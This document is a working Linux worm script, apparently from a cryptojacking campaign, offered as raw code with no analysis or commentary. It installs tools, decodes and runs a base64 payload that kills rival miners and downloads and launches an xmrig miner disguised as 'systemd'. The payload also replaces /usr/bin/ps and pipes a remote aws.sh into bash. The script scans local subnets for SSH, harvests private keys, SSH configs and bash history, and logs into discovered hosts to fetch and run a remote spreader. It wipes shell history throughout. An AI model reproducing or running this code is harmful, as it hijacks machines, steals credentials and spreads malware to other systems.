#!/bin/sh

clear
if [ ! -f "/var/tmp/.alsp" ]; then  echo '###################################################################' ; echo '###################################################################'
curl -s 147.75.47.199 || mcurl -s 147.75.47.199 ; echo '###################################################################' ; echo '###################################################################'
else echo "replay .. i know this server ..." ; exit ; fi

PWNWITHTHISLINK="http://45.9.148.85/chimaera/sh/spread_ssh.sh"


function loadthisfile(){
GETFROM=$1
PUTITTO=$2
if [ -f "$PUTITTO" ]; then mchattr -i $PUTITTO 2>/dev/null 1>/dev/null ; chattr -i $PUTITTO 2>/dev/null 1>/dev/null ; tntrecht -i $PUTITTO 2>/dev/null 1>/dev/null ; rm -f $PUTITTO 2>/dev/null 1>/dev/null ; fi
mcurl $GETFROM -o $PUTITTO || curl $GETFROM -o $PUTITTO || cur $GETFROM -o $PUTITTO || cdl $GETFROM -o $PUTITTO || TNTcurl $GETFROM -o $PUTITTO || mwget $GETFROM -O $PUTITTO || wget $GETFROM -O $PUTITTO || wge $GETFROM -O $PUTITTO || wdl $GETFROM -O $PUTITTO || TNTwget $GETFROM -O $PUTITTO
}	

function setupmyapps(){
if ! type sudo 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y sudo 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y sudo 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add sudo 2>/dev/null 1>/dev/null; fi ; fi

if ! type chattr 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add e2fsprogs 2>/dev/null 1>/dev/null; fi ; fi

if ! type bash 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi ; fi

if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi ; fi

if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi

if ! type gcc 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y gcc 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall gcc 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y gcc 2>/dev/null 1>/dev/null ; yum reinstall -y gcc 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add gcc 2>/dev/null 1>/dev/null ; fi ; fi

if ! type make 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y make 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall make 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y make 2>/dev/null 1>/dev/null ; yum reinstall -y make 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add make 2>/dev/null 1>/dev/null ; fi ; fi


echo 'CmNoYXR0ciAtUiAtaWEgL3RtcC8gMj4vZGV2L251bGwKY2hhdHRyIC1SIC1pYSAvdmFyL3RtcC8gMj4vZGV2L251bGwKcm0gLWZyIC90bXAvIDI+L2Rldi9udWxsICYmIG1rZGlyIC1wIC90bXAvIDI+L2Rldi9udWxsCnJtIC1mciAvdmFyL3RtcC8gMj4vZGV2L251bGwgJiYgbWtkaXIgLXAgL3Zhci90bXAvIDI+L2Rldi9udWxsCgpwa2lsbCB4bXJpZyAyPi9kZXYvbnVsbApwa2lsbCBzeXN0ZW1kIDI+L2Rldi9udWxsCmtpbGwgJChwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdcLlwvcHl0aG9uJyB8IGF3ayAne3ByaW50ICQyfScpIDI+L2Rldi9udWxsCmtpbGwgJChwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdcLlwveG1yaWcnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC9tZWxsaW4nIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC96c2guc2gnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC96c2gnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKCgpwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdraW5zaW5nJyB8IGF3ayAne3ByaW50ICQyfScgPj4gL3RtcC8uYmFkcHJvY3MgMj4vZGV2L251bGwKd2hpbGUgcmVhZCBCQURQUk9DOyBkbyBraWxsICRCQURQUk9DIDsgZG9uZSA8IC90bXAvLmJhZHByb2NzIDsgcm0gLWYgL3RtcC8uYmFkcHJvY3MKCiMKCmN1cmwgaHR0cDovLzQ1LjkuMTQ4Ljg1L3htcmlnX3BzIC1vIC92YXIvdG1wL3N5c3RlbWQgfHwgd2dldCBodHRwOi8vNDUuOS4xNDguODUveG1yaWdfcHMgLU8gL3Zhci90bXAvc3lzdGVtZApjaG1vZCAreCAvdmFyL3RtcC9zeXN0ZW1kICYmIGNkIC92YXIvdG1wLyAmJiAuL3N5c3RlbWQgJiYgY2QgLwoKY2hhdHRyIC1pIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCnJtIC1mIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCmNwIC92YXIvdG1wL3N5c3RlbWQgL3Vzci9iaW4vcHMgMj4vZGV2L251bGwKY2htb2QgK3ggL3Vzci9iaW4vcHMgMj4vZGV2L251bGwKY2hhdHRyICtpIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCgoKaGlzdG9yeSAtYwplY2hvIDAgPiB+Ly5iYXNoX2hpc3RvcnkKCmNsZWFyCmlmIHR5cGUgY3VybCAyPi9kZXYvbnVsbCA7IHRoZW4gY3VybCBodHRwOi8vNDUuOS4xNDguODUvYXdzLnNoIHwgYmFzaAplbGlmIHR5cGUgd2dldCAyPi9kZXYvbnVsbCA7IHRoZW4gd2dldCAtTyAtIGh0dHA6Ly80NS45LjE0OC44NS9hd3Muc2ggfCBiYXNoIDsgZmkKCgpzbGVlcCAyCmhpc3RvcnkgLWMKZWNobyAwID4gfi8uYmFzaF9oaXN0b3J5CgpjbGVhcgo=' | base64 -d | bash


if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
echo "Setup PnScan ..." ; mkdir -p /tmp/ps/ ; cd /tmp/ps
loadthisfile http://45.9.148.85/chimaera/bin/pnscan_1.12+git20180612.orig.tar.gz /tmp/ps/.x112
sleep 1
[ -f .x112 ] && tar xf /tmp/ps/.x112 -C /tmp/ps/ 2>/dev/null 1>/dev/null
cd pnscan-1.12 2>/dev/null 1>/dev/null
make lnx  2>/dev/null 1>/dev/null
cp pnscan /usr/bin/pnscan 2>/dev/null 1>/dev/null
chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null
make install 2>/dev/null 1>/dev/null
cd .. 2>/dev/null 1>/dev/null
rm -rf .x112 ps 2>/dev/null 1>/dev/null
fi
}



function getsomelanssh(){
mkdir /home/hilde/.ssh/ -p 2>/dev/null 1>/dev/null
> /home/hilde/.ssh/known_hosts 2>/dev/null 1>/dev/null
ip route show | grep -v grep | grep -v blackhole | grep "/" | awk '{print $1}' >> /home/hilde/.ssh/.ranges

for i in $(cat /home/hilde/.ssh/.ranges); do echo "scanne "$i
pnscan $i 22 >> /home/hilde/.ssh/.known_hosts
done;
rm -f /home/hilde/.ssh/.ranges
cat /home/hilde/.ssh/.known_hosts | awk '{print $1}' >> /home/hilde/.ssh/known_hosts
rm -f /home/hilde/.ssh/.known_hosts
}

localgo() {
  myhostip=$(curl -sL 147.75.47.199 || mcurl -s 147.75.47.199)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  pl=$(
    echo "22"
    cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}'
  )
  sshports=$(echo "$pl" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          i=$((i+1))
          if [ "${i}" -eq "20" ]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi
          chmod +r $key
          chmod 400 $key
          echo "$user@$host $key $sshp"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(curl -Ls $PWNWITHTHISLINK | sh || cur -Ls $PWNWITHTHISLINK | sh || cdl -Ls $PWNWITHTHISLINK | sh || wget -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wge -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wdl -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh);"
        done
      done
    done
  done
}

if [ ! -f "/var/tmp/.alsp" ]; then
setupmyapps
uploadthersa
getsomelanssh
localgo
echo 'lockfile' > /var/tmp/.alsp
tntrecht +i /var/tmp/.alsp || chattr +i /var/tmp/.alsp
else
echo "replay .. i know this server ..."
exit
fi
rm -f /home/hilde/.ssh/known_hosts 2>/dev/null
history -c

